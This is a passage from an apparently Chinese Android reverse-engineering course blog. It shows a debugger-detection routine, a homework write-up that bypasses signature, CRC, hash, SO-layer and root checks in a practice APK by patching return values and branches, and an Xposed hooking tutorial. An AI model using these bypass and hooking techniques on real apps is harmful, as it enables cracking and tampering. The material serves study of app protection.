class="keyword">if</span>(<span class="literal">NULL</span>==pfile)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//LOGA(&quot;SearchObjProcess popen打开命令失败!\n&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取结果</span></span><br><span class="line">    <span class="comment">//LOGA(&quot;popen方案:\n&quot;);</span></span><br><span class="line">    <span class="keyword">while</span>(fgets(buf,<span class="keyword">sizeof</span>(buf),pfile))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span>* strA=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">char</span>* strB=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">char</span>* strC=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">char</span>* strD=<span class="literal">NULL</span>;</span><br><span class="line">        strA=<span class="built_in">strstr</span>(buf,<span class="string">&quot;android_server&quot;</span>);<span class="comment">//通过查找匹配子串判断</span></span><br><span class="line">        strB=<span class="built_in">strstr</span>(buf,<span class="string">&quot;gdbserver&quot;</span>);</span><br><span class="line">        strC=<span class="built_in">strstr</span>(buf,<span class="string">&quot;gdb&quot;</span>);</span><br><span class="line">        strD=<span class="built_in">strstr</span>(buf,<span class="string">&quot;fuwu&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(strA || strB ||strC || strD)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 执行到这里，判定为调试状态</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pclose(pfile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h4 id="反调试对抗"   >
          <a href="#反调试对抗" class="heading-link"><i class="fas fa-link"></i></a><a href="#反调试对抗" class="headerlink" title="反调试对抗"></a>反调试对抗</h4>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-268155.htm" >https://bbs.pediy.com/thread-268155.htm</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="frida检测"   >
          <a href="#frida检测" class="heading-link"><i class="fas fa-link"></i></a><a href="#frida检测" class="headerlink" title="frida检测"></a>frida检测</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/xxr0ss/AntiFrida" >https://github.com/xxr0ss/AntiFrida</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="课后作业-3"   >
          <a href="#课后作业-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#课后作业-3" class="headerlink" title="课后作业"></a>课后作业</h3>
      <ul>
<li><p>普通签名校验：</p>
<p>重新签名安装，检测到应用退出，开启算法助手退出拦截和日志捕获，定位到com.zj.wuaipojie.ui.ChallengeFifth.onCreate</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240126090748593.png" alt="image-20240126090748593"></p>
<p>然后分析onCreate，存在checkSign和root检测</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240126090911296.png" alt="image-20240126090911296"></p>
<p>剩下的分析一下，把checkSign返回为True即可，即在return之前始终赋值返回值为1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240126092212041.png" alt="image-20240126092212041"></p>
<p>root检测部分也是一样的，返回值赋值为0即可</p>
</li>
<li><p>API校验：</p>
<p>即获取包的签名信息，转换为字符串之后进行base64编码，然后md5输出</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240126093820523.png" alt="image-20240126093820523"></p>
<p>如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240126093838967.png" alt="image-20240126093838967"></p>
<p>要么可以重定向，要么进行PM代理，或者直接改代码，返回值修改为1即可</p>
</li>
<li><p>CRC校验：</p>
<p>详见代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240126094504066.png" alt="image-20240126094504066"></p>
<p>即校验classes.dex文件，这里通用可以返回值赋值为1解决。</p>
<p>但是这里有个try-catch，并且catch始终返回为true。那么可以尝试让try中出错，进而跳转到catch，这里让classes.dex字符串修改为classes2.dex，这样找不到这个文件自然会出错，跳转到catch。</p>
</li>
<li><p>PM校验：详见PM代理部分</p>
</li>
<li><p>Hash校验：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240126095100866.png" alt="image-20240126095100866"></p>
<p>直接用返回1解决</p>
</li>
<li><p>SO层校验</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240126101106229.png" alt="image-20240126101106229"></p>
<p>修改if条件语句即可，if-eqz修改为if-nez</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240126101125281.png" alt="image-20240126101125281"></p>
<p>整体通过</p>
</li>
</ul>

        <h2 id="课程七-八、Sorry，会Hook真的可以为所欲为-Xposed快速上手"   >
          <a href="#课程七-八、Sorry，会Hook真的可以为所欲为-Xposed快速上手" class="heading-link"><i class="fas fa-link"></i></a><a href="#课程七-八、Sorry，会Hook真的可以为所欲为-Xposed快速上手" class="headerlink" title="课程七/八、Sorry，会Hook真的可以为所欲为-Xposed快速上手"></a>课程七/八、Sorry，会Hook真的可以为所欲为-Xposed快速上手</h2>
      
        <h3 id="环境配置"   >
          <a href="#环境配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3>
      <p>创建空白的android项目，使用java和android7作为目标</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240112091059961.png" alt="image-20240112091059961"></p>
<p>复制xposed的jar包到项目的libs目录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240112091212033.png" alt="image-20240112091212033"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240112091325824.png" alt="image-20240112091325824"></p>
<p>修改xml文件配置，src-&gt;main-&gt;AndroidManifest.xml，修改如下</p>
<figure class="highlight xml"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.XposedPro&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">tools:targetApi</span>=<span class="string">&quot;31&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 是否是xposed模块，xposed根据这个来判断是否是模块 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;xposedmodule&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 模块描述，显示在xposed模块列表那里第二行 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;xposeddescription&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">&quot;这是一个Xposed模块&quot;</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 最低xposed版本号(lib文件名可知) --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;xposedminversion&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">&quot;89&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>修改build.gradle.kts</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">implementation(files(&quot;libs\\XposedBridgeAPI-89.jar&quot;))</span><br><span class="line">修改为</span><br><span class="line">compileOnly(files(&quot;libs\\XposedBridgeAPI-89.jar&quot;))</span><br></pre></td></tr></table></div></figure>

<p>区别在于implementation 使用该方式依赖的库将会参与编译和打包 compileOnly 只在编译时有效，不会参与打包</p>
<p>然后app新建目录，new-&gt;Folder-&gt;Assets Folder</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240112092036425.png" alt="image-20240112092036425"></p>
<p>assets目录下创建文件，为模块入口</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240112092203496.png" alt="image-20240112092203496"></p>
<p>app-&gt;src-&gt;java-&gt;com下新建hook类</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240112092318996.png" alt="image-20240112092318996"></p>
<p>然后需要在xposed_init中指定hook类入口</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240112092351263.png" alt="image-20240112092351263"></p>
<p>继承了IXposedHookLoadPackag便拥有了hook的能力，然后在Hook.java里面写代码就行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240112092504885.png" alt="image-20240112092504885"></p>

        <h3 id="HOOK代码"   >
          <a href="#HOOK代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#HOOK代码" class="headerlink" title="HOOK代码"></a>HOOK代码</h3>
      
        <h4 id="hook指定包"   >
          <a href="#hook指定包" class="heading-link"><i class="fas fa-link"></i></a><a href="#hook指定包" class="headerlink" title="hook指定包"></a>hook指定包</h4>
      <p>首先指定需要hook的包</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hook</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.zj.wuaipojie&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>添加了if语句代表只hook掉com.zj.wuaipojie这个apk</p>

        <h4 id="hook指定函数"   >
          <a href="#hook指定函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#hook指定函数" class="headerlink" title="hook指定函数"></a>hook指定函数</h4>
      <p>在jadx中可以选定某个方法，复制为xposed片段，比如这里选择hook掉a方法</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240112093644001.png" alt="image-20240112093644001"></p>
<p>复制之后放入if语句后面即可，需要导入包，然后在修改classLoader，添加前缀loadPackageParam.classLoader</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">XposedHelpers.findAndHookMethod(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>, loadPackageParam.classLoader, <span class="string">&quot;a&quot;</span>, java.lang.String.class, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.beforeHookedMethod(param);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.afterHookedMethod(param);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></div></figure>

<p>即传入类，classLoader，方法名称，参数类型，然后重写beforeHookedMethod和afterHookedMethod回调函数即可</p>
<p>或者直接用反射来获取，通常可以用来hook自定义或者复杂函数</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class a = loadPackageParam.classLoader.loadClass(<span class="string">&quot;类名&quot;</span>);</span><br><span class="line">XposedBridge.hookAllMethods(a, <span class="string">&quot;方法名&quot;</span>, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.beforeHookedMethod(param);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></div></figure>




        <h4 id="参数处理"   >
          <a href="#参数处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#参数处理" class="headerlink" title="参数处理"></a>参数处理</h4>
      <p>在beforeHookedMethod中处理参数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String a = &quot;aaaaaaaa&quot;;</span><br><span class="line">XposedBridge.log(param.args[0].toString()); //打印参数</span><br><span class="line">param.args[0] = a; //修改参数</span><br></pre></td></tr></table></div></figure>

<p>在afterHookedMethod中处理返回值</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Log.d(&quot;zj2595&quot;,param.getResult().toString()); //获取返回值</span><br><span class="line">param.setResult(&quot;123456&quot;); //设置返回值</span><br></pre></td></tr></table></div></figure>


        <h4 id="替换函数"   >
          <a href="#替换函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#替换函数" class="headerlink" title="替换函数"></a>替换函数</h4>
      <p>类似的</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Class a = classLoader.loadClass(<span class="string">&quot;类名&quot;</span>)</span><br><span class="line">XposedBridge.hookAllMethods(a,<span class="string">&quot;方法名&quot;</span>,<span class="keyword">new</span> XC_MethodReplacement() &#123;  </span><br><span class="line">    home.php?mod=space&amp;uid=<span class="number">1892347</span>  </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">replaceHookedMethod</span><span class="params">(MethodHookParam methodHookParam)</span> <span class="keyword">throws</span> Throwable </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></div></figure>


        <h4 id="通杀大部分免费加壳"   >
          <a href="#通杀大部分免费加壳" class="heading-link"><i class="fas fa-link"></i></a><a href="#通杀大部分免费加壳" class="headerlink" title="通杀大部分免费加壳"></a>通杀大部分免费加壳</h4>
      <p>针对一些加固的APP，需要先获取到classloader才能接着hook</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">XposedHelpers.findAndHookMethod(Application.class, <span class="string">&quot;attach&quot;</span>, Context.class, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        Context context = (Context) param.args[<span class="number">0</span>];</span><br><span class="line">        ClassLoader classLoader = context.getClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//hook逻辑在这里面写</span></span><br><span class="line">        XposedHelpers.findAndHookMethod(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>, loadPackageParam.classLoader, <span class="string">&quot;a&quot;</span>, java.lang.String.class, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="keyword">super</span>.beforeHookedMethod(param);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="keyword">super</span>.afterHookedMethod(param);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></div></figure>


        <h4 id="处理变量"   >
          <a href="#处理变量" class="heading-link"><i class="fas fa-link"></i></a><a href="#处理变量" class="headerlink" title="处理变量"></a>处理变量</h4>
      <p>没有的就用Object</p>
<p>string-&gt;Object</p>
<ul>
<li><p>静态变量</p>
<p>static的，类被初始化，同步进行初始化</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Class clazz = XposedHelpers.findClass(<span class="string">&quot;类名&quot;</span>, loadPackageParam.classLoader); </span><br><span class="line">XposedHelpers.setStaticIntField(clazz, <span class="string">&quot;变量名&quot;</span>, <span class="number">999</span>);</span><br></pre></td></tr></table></div></figure></li>
<li><p>实例变量</p>
<p>类被实例化（产生一个对象的时候），进行初始化</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Class clazz = XposedHelpers.findClass(<span class="string">&quot;类名&quot;</span>, classLoader);  </span><br><span class="line">XposedBridge.hookAllConstructors(clazz, <span class="keyword">new</span> XC_MethodHook() &#123;  <span class="comment">//先hook构造函数</span></span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;  <span class="comment">//在构造函数初始化变量之后</span></span><br><span class="line">        <span class="keyword">super</span>.afterHookedMethod(param);  </span><br><span class="line">        <span class="comment">//param.thisObject获取当前所属的对象</span></span><br><span class="line">        Object ob = param.thisObject;  </span><br><span class="line">        XposedHelpers.setIntField(ob,<span class="string">&quot;变量名&quot;</span>,<span class="number">9999</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h4 id="处理构造函数"   >
          <a href="#处理构造函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#处理构造函数" class="headerlink" title="处理构造函数"></a>处理构造函数</h4>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//无参构造函数，没有传入参数</span></span><br><span class="line">XposedHelpers.findAndHookConstructor(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>, loadPackageParam.classLoader, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.beforeHookedMethod(param);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.afterHookedMethod(param);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//有参构造函数，传入了参数string.class</span></span><br><span class="line">XposedHelpers.findAndHookConstructor(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>, loadPackageParam.classLoader, String.class, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.beforeHookedMethod(param);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.afterHookedMethod(param);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></div></figure>


        <h4 id="处理Dex文件"   >
          <a href="#处理Dex文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#处理Dex文件" class="headerlink" title="处理Dex文件"></a>处理Dex文件</h4>
      <p>一个dex中最多只能存在65535个方法，如果超过这个数，就会重新生成dex文件</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">XposedHelpers.findAndHookMethod(Application.class, <span class="string">&quot;attach&quot;</span>, Context.class, <span class="keyword">new</span> XC_MethodHook() &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;  </span><br><span class="line">        ClassLoader cl= ((Context)param.args[<span class="number">0</span>]).getClassLoader();  </span><br><span class="line">        Class&lt;?&gt; hookclass=<span class="keyword">null</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            hookclass=cl.loadClass(<span class="string">&quot;类名&quot;</span>);  </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;  </span><br><span class="line">            Log.e(<span class="string">&quot;zj2595&quot;</span>,<span class="string">&quot;未找到类&quot;</span>,e);  </span><br><span class="line">            <span class="keyword">return</span>;        </span><br><span class="line">        &#125;  </span><br><span class="line">        XposedHelpers.findAndHookMethod(hookclass, <span class="string">&quot;方法名&quot;</span>, <span class="keyword">new</span> XC_MethodHook() &#123;  </span><br><span class="line">            <span class="meta">@Override</span>  </span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;  </span><br><span class="line">            &#125;        </span><br><span class="line">        &#125;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></div></figure>


        <h4 id="函数主动调用"   >
          <a href="#函数主动调用" class="heading-link"><i class="fas fa-link"></i></a><a href="#函数主动调用" class="headerlink" title="函数主动调用"></a>函数主动调用</h4>
      <ul>
<li><p>静态函数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = XposedHelpers.findClass(&quot;类名&quot;,loadPackageParam.classLoader);</span><br><span class="line">XposedHelpers.callStaticMethod(clazz,&quot;方法名&quot;,参数(非必须));</span><br></pre></td></tr></table></div></figure></li>
<li><p>实例函数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = XposedHelpers.findClass(&quot;类名&quot;,loadPackageParam.classLoader);</span><br><span class="line">XposedHelpers.callMethod(clazz.newInstance(),&quot;方法名&quot;,参数(非必须));</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h4 id="内部类"   >
          <a href="#内部类" class="heading-link"><i class="fas fa-link"></i></a><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h4>
      <p>类中还有一个class，其实就是加入<code>$</code>符号来寻找类</p>
